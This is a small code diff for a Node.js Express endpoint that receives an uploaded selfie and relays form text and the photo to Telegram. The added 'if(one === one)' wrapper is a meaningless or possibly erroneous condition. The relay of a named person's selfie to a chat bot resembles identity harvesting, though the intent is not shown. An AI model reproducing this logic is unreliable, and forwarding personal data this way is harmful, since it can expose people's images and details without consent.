@@ -138,9 +138,10 @@ app.post('/api/data', upload.single('selfie'), async (req, res) => {
         await sendTextToTelegram(formattedText);
 
         // Send selfie to Telegram with a caption if there is one
+        if(one === one){
         const caption = `📸 Selfie from: ${name}`;
         await sendPhotoToTelegram(selfieFile.path, caption);
-        
+        }
 
         res.json({ 
             success: true, 
